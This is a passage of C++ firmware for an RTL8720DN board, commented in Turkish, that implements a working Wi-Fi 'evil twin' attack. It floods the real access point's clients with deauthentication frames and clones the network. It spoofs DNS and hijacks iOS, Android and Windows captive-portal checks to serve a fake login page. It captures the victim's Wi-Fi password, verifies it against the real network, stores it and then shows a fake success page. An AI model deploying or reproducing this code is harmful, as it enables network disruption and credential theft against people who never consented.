           " Birka&#231; saniye i&#231;inde otomatik olarak ba&#287;lanacaks&#305;n&#305;z.</p>"
        "<ul class='steps-ok'>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>A&#287; g&#252;venli&#287;i do&#287;ruland&#305;</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>Ba&#287;lant&#305; yenilendi</span></li>"
          "<li><span class='ok-ico'>&#10004;</span>"
            "<span>&#304;nternet eri&#351;imi aktif</span></li>"
        "</ul>"
      "</div>"
    "</div>"
    "</body></html>");
  et_send_html(client, html);
}

// ─── OS tespiti ve portal yönlendirme ────────────────────────────────────────
static void portal_serve(WiFiClient &client, const String &request, bool wrong_pass) {
  String ua = et_get_ua(request);
  bool is_ios     = ua.indexOf("iPhone") >= 0 || ua.indexOf("iPad") >= 0 || ua.indexOf("iPod") >= 0;
  bool is_android = ua.indexOf("Android") >= 0;
  if (is_ios)          portal_ios    (client, wrong_pass);
  else if (is_android) portal_android(client, wrong_pass);
  else                 portal_windows(client, wrong_pass);
}

// ─── URL yüzde kodunu çöz ─────────────────────────────────────────────────────
static String et_url_decode(const String &s) {
  String out;
  out.reserve(s.length());
  for (int i = 0; i < (int)s.length(); i++) {
    if (s[i] == '+') {
      out += ' ';
    } else if (s[i] == '%' && i + 2 < (int)s.length()) {
      char h[3] = {s[i+1], s[i+2], '\0'};
      out += (char)strtol(h, nullptr, 16);
      i += 2;
    } else {
      out += s[i];
    }
  }
  return out;
}

// ─── POST gövdesinden "password" alanını çıkar ───────────────────────────────
static String et_extract_password(const String &request) {
  int bs = request.indexOf("\r\n\r\n");
  if (bs == -1) return "";
  String body = request.substring(bs + 4);
  int p = body.indexOf("password=");
  int skip = 9;
  if (p < 0) { p = body.indexOf("pw="); skip = 3; }
  if (p < 0) return "";
  String val = body.substring(p + skip);
  int amp = val.indexOf('&');
  if (amp >= 0) val = val.substring(0, amp);
  return et_url_decode(val);
}

// ─── Şifre kaydet ─────────────────────────────────────────────────────────────
static void et_save_password(const String &password, bool verified) {
  if (et_password_count >= ET_MAX_PASSWORDS) return;
  for (int i = 0; i < et_password_count; i++) {
    if (et_passwords[i].password == password) {
      if (verified) et_passwords[i].verified = true;
      return;
    }
  }
  et_passwords[et_password_count].ssid     = evil_twin_ssid;
  et_passwords[et_password_count].password = password;
  et_passwords[et_password_count].verified = verified;
  et_password_count++;
}

// ─── Şifre doğrulama ──────────────────────────────────────────────────────────
// STA moduna geçip gerçek AP'ye bağlanmayı dener.
// Başarılı → true, başarısız → false.
// Her iki durumda da AP'yi yeniden başlatır.
static bool et_verify_password(const String &password) {
  // 1. DNS'i durdur
  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
  delay(200);

  // 2. STA modunda bağlan
  char et_ssid_buf[64];
  strncpy(et_ssid_buf, evil_twin_ssid.c_str(), sizeof(et_ssid_buf) - 1);
  et_ssid_buf[sizeof(et_ssid_buf) - 1] = '\0';

  WiFi.begin(et_ssid_buf, password.c_str());
  bool ok = false;
  unsigned long t0 = millis();
  while (millis() - t0 < ET_VERIFY_TIMEOUT_MS) {
    if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
    delay(100);
  }
  WiFi.disconnect();
  delay(400); // Bağlantı kesme için süre

  // 3. ET AP'yi yeniden başlat
  et_ap_start(evil_twin_ssid, evil_twin_channel);
  delay(500); // AP'nin hazır olması için yeterli süre

  // 4. DNS'i yeniden başlat
  et_dns_udp.begin(53);
  et_dns_started = true;

  return ok;
}

// ─── Hedef yeniden bulma (Retrack) ────────────────────────────────────────────
static rtw_result_t et_retrack_handler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete != 0) return RTW_SUCCESS;
  rtw_scan_result_t *r = &scan_result->ap_details;
  uint8_t bssid[6];
  memcpy(bssid, &r->BSSID, 6);
  if (memcmp(bssid, (const void *)evil_twin_bssid, 6) == 0) {
    et_rt_found   = true;
    et_rt_channel = (uint8_t)r->channel;
    memcpy(et_rt_bssid, bssid, 6);
    return RTW_SUCCESS;
  }
  r->SSID.val[r->SSID.len] = '\0';
  String found_ssid = String((const char *)r->SSID.val);
  if (!et_rt_found && found_ssid == evil_twin_ssid) {
    et_rt_found   = true;
    et_rt_channel = (uint8_t)r->channel;
    memcpy(et_rt_bssid, bssid, 6);
  }
  return RTW_SUCCESS;
}

static void et_retrack() {
  // ── ARAŞTIRMA BULGUSU: wifi_scan_networks() AP çalışırken çağrılmamalı ──
  //
  // RTL8720DN tek radyo paylaşımlı mimari:
  //   wifi_scan_networks() → tüm kanallara hop yapar → AP beacon'ları kesilir
  //   → istemciler düşer, AP "kaybolur"
  //   → Scan fonksiyonu SoftAP aktifken RTW_ERROR döndürebilir.
  //
  // Çözüm: AP durdur → tara → AP yeniden başlat.
  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() yapar.
  //
  // Referans: forum.amebaiot.com, RTL8720dn-5GHz-Wifi-Deauther, Evil-BW16.

  // 1. DNS durdur
  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }

  // 2. Radyoyu serbest bırak (et_ap_start içindeki disconnect/disableSTA ile aynı)
  WiFi.disconnect();
  WiFi.disableSTA();
  delay(200);

  // 3. Tara — radyo artık serbest, AP yok, scan çalışabilir
  et_rt_found   = false;
  et_rt_channel = 0;
  bool scan_ok = (wifi_scan_networks(et_retrack_handler, NULL) == RTW_SUCCESS);
  if (scan_ok) delay(5000); // Taramanın tamamlanmasını bekle

  // 4. Kanal/BSSID değişikliği var mı?
  bool channel_changed = false;
  bool bssid_changed   = false;
  if (et_rt_found) {
    channel_changed = ((uint8_t)et_rt_channel != (uint8_t)evil_twin_channel);
    bssid_changed   = (memcmp(et_rt_bssid, evil_twin_bssid, 6) != 0);
    if (channel_changed) evil_twin_channel = (int)et_rt_channel;
    if (bssid_changed)   memcpy(evil_twin_bssid, et_rt_bssid, 6);
  }

  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+disableSTA+apbegin)
  et_ap_start(evil_twin_ssid, evil_twin_channel);
  delay(500);

  // 6. DNS'i yeniden başlat
  et_dns_udp.begin(53);
  et_dns_started = true;

  // 7. Kanal değiştiyse hemen deauth burst gönder
  if (channel_changed || bssid_changed) et_last_deauth_ms = 0;
}

// ─── Deauth burst ─────────────────────────────────────────────────────────────
//
// ARAŞTIRMA BULGUSUNA DAYALI MİMARİ DÜZELTME (tesa-klebeband, Ameba SDK forum):
//
// RTL8720DN iki bağımsız arayüze sahiptir:
//   WLAN0 = STA / raw frame injection  (wext_set_channel bu arayüzü kullanır)
//   WLAN1 = SoftAP                      (WiFi.apbegin() DAIMA WLAN1 kullanır)
//
// Bu nedenle wext_set_channel(WLAN0_NAME, ...) AP'yi (WLAN1) HİÇ ETKİLEMEZ.
// Dual-band deauth hem WLAN0'ı hem de WLAN1'i kesmeden yapılabilir.
//
// Referanslar:
//   - deepwiki.com/7h30th3r0n3/Evil-BW16/6-technical-reference
//   - forum.amebaiot.com/t/rtl8720dn-is-802-11-frame-injection-possible/883
//   - tesa-klebeband.github.io/making-raw-802-11-frame-injection-possible-on-an-rtl8720dn
static void et_send_deauth_burst() {
  static const uint8_t reasons[] = {2, 3, 6, 7, 8};
  const char *ssid_c = evil_twin_ssid.c_str();

  // ── Birincil band (WLAN0 → hedef kanal) ──────────────────────────────────
  // WLAN1'deki AP bundan etkilenmez — bağımsız arayüzler.
  wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
  for (int r = 0; r < 5; r++) {
    wifi_tx_deauth_frame  (evil_twin_bssid, et_broadcast, reasons[r]);
    wifi_tx_disassoc_frame(evil_twin_bssid, et_broadcast, reasons[r]);
  }
  // Beacon: DS Parameter Set IE ile kanal bilgisi dahil — istemci bağlanmayı dener
  for (int i = 0; i < 3; i++) {
    wifi_tx_beacon_frame(evil_twin_bssid, et_broadcast, ssid_c,
                         (uint8_t)evil_twin_channel);
  }

  // ── İkinci band (çift bant aktifse, WLAN0 kanal değiştir) ────────────────
  // AP WLAN1'de güvenle devam eder; WLAN0 kanal değişikliği sadece injection'ı etkiler.
  if (evil_twin_dual_band && evil_twin_channel2 > 0) {
    wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel2);
    const char *ssid_c2 = (evil_twin_ssid2.length() > 0)
                            ? evil_twin_ssid2.c_str() : ssid_c;
    for (int r = 0; r < 5; r++) {
      wifi_tx_deauth_frame  (evil_twin_bssid2, et_broadcast, reasons[r]);
      wifi_tx_disassoc_frame(evil_twin_bssid2, et_broadcast, reasons[r]);
    }
    for (int i = 0; i < 3; i++) {
      wifi_tx_beacon_frame(evil_twin_bssid2, et_broadcast, ssid_c2,
                           (uint8_t)evil_twin_channel2);
    }
    // Birincil kanala geri dön (DNS ve web sunucusu için gerekli değil ama tutarlılık için)
    wext_set_channel(WLAN0_NAME, (uint8_t)evil_twin_channel);
  }
}

// ─── Evil Twin başlat ─────────────────────────────────────────────────────────
void start_evil_twin(int /*scan_idx*/) {
  evil_twin_active     = true;
  evil_twin_clients    = 0;
  et_last_deauth_ms    = 0;          // İlk burst hemen gönderilsin
  et_last_retrack_ms   = millis();
  et_last_verify_ok    = false;
  et_last_verify_pass  = "";
  et_rt_found          = false;

  // DNS'i temizle (önceki oturumdan kalıntı olabilir)
  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }

  // ET AP'yi başlat
  et_ap_start(evil_twin_ssid, evil_twin_channel);
  delay(500); // AP'nin tam hazır olması için yeterli süre

  // DNS spoofer başlat
  et_dns_udp.begin(53);
  et_dns_started = true;
}

// ─── Evil Twin durdur ─────────────────────────────────────────────────────────
void stop_evil_twin() {
  evil_twin_active     = false;
  evil_twin_clients    = 0;
  evil_twin_dual_band  = false;
  evil_twin_channel2   = 0;
  memset(evil_twin_bssid2, 0, 6);
  evil_twin_ssid2      = "";

  if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }

  // Yönetim AP'sini yeniden başlat — aynı STA teardown sekansı gerekli.
  // et_ap_start() zaten WiFi.disconnect() + WiFi.disableSTA() + delay yapar.
  // Burada doğrudan ssid/pass ile çağırıyoruz.
  WiFi.disconnect();
  WiFi.disableSTA();
  delay(300);
  { char c[] = "1"; WiFi.apbegin(ssid, pass, c); }
  delay(500);
}

// ─── Evil Twin ana döngüsü ────────────────────────────────────────────────────
void evil_twin_loop() {
  if (!evil_twin_active) return;

  // DNS sorgularını işle
  if (et_dns_started) et_dns_process_packet();

  unsigned long now = millis();

  // Deauth burst: ET_DEAUTH_INTERVAL_MS ms'de bir
  if (now - et_last_deauth_ms >= ET_DEAUTH_INTERVAL_MS) {
    et_last_deauth_ms = now;
    et_send_deauth_burst();
  }

  // Kanal takibi: ET_RETRACK_INTERVAL_MS ms'de bir (~5 sn bloklayan tarama)
  if (now - et_last_retrack_ms >= ET_RETRACK_INTERVAL_MS) {
    et_last_retrack_ms = now;
    et_retrack();
  }
}

// ─── Captive Portal HTTP işleyici ────────────────────────────────────────────
bool evil_twin_portal_handle(WiFiClient &client,
                             const String &request,
                             const String &path) {
  if (!evil_twin_active) return false;

  // Admin yolları → admin panele bırak
  if (path == "/"               ||
      path == "/admin"          ||
      path == "/rescan"         ||
      path == "/stop"           ||
      path == "/deauth"         ||
      path == "/evil_twin"      ||
      path == "/stop_evil_twin") {
    return false;
  }

  // ── OS Captive Portal Algılama URL'leri ──────────────────────────────────
  //
  // Android (Chrome / AOSP):
  //   /generate_204            — Ana algılama (HTTP 204 beklenir)
  //   /gen_204                 — Alternatif
  //   /connecttest.txt         — Android 10+ ek kontrol
  //
  // iOS / macOS:
  //   /hotspot-detect.html     — iOS 7–17 temel kontrol
  //   /library/test/success.html  — iOS / Safari
  //   /success.txt             — macOS
  //   /captive.apple.com/...   — iOS 14+ (DNS ile yakalanır)
  //
  // Windows:
  //   /connecttest.txt         — Windows 10/11 NCSI
  //   /ncsi.txt                — Windows 7/8/10 eski NCSI
  //   /redirect                — Windows 10 yönlendirme uç noktası
  //   /canonical.html          — IE captive portal
  //
  // Genel:
  //   /favicon.ico             — Bazı tarayıcılar bunu test eder

  auto redir_portal = [&]() {
    et_send_redirect(client, "http://" ET_AP_IP_STR "/portal");
  };

  // Android generate_204: gerçek ağda 204 döner, yoksa captive portal açar.
  // Biz doğrudan portala yönlendiriyoruz (302) → Android captive portal diyalogu açılır.
  if (path == "/generate_204"              ||
      path.startsWith("/generate_204?")    ||
      path == "/gen_204"                   ||
      path.startsWith("/gen_204?")) {
    redir_portal();
    return true;
  }

  // iOS / macOS
  if (path == "/hotspot-detect.html"       ||
      path == "/library/test/success.html" ||
      path == "/success.txt"               ||
      path == "/canonical.html") {
    redir_portal();
    return true;
  }

  // Windows NCSI
  if (path == "/connecttest.txt"           ||
      path == "/ncsi.txt"                  ||
      path == "/redirect"                  ||
      path == "/redirect.txt") {
    redir_portal();
    return true;
  }

  // Genel
  if (path == "/favicon.ico") {
    redir_portal();
    return true;
  }

  // ── POST /portal/submit — şifre alma ─────────────────────────────────────
  if (path == "/portal/submit") {
    String password = et_extract_password(request);
    if (password.length() < 1) {
      et_send_redirect(client, "http://" ET_AP_IP_STR "/portal");
      return true;
    }

    et_save_password(password, false);
    et_last_verify_pass = password;

    bool ok = et_verify_password(password);
    if (ok) {
      et_save_password(password, true);
      et_last_verify_ok = true;
      portal_success(client);
      delay(3000);
      stop_evil_twin();
    } else {
      portal_serve(client, request, true);
    }
    return true;
  }

  // ── GET /portal — Portal ana sayfası ─────────────────────────────────────
  if (path == "/portal") {
    portal_serve(client, request, false);
    return true;
  }

  // Bilinmeyen yol → portala yönlendir
  redir_portal();
  return true;
}
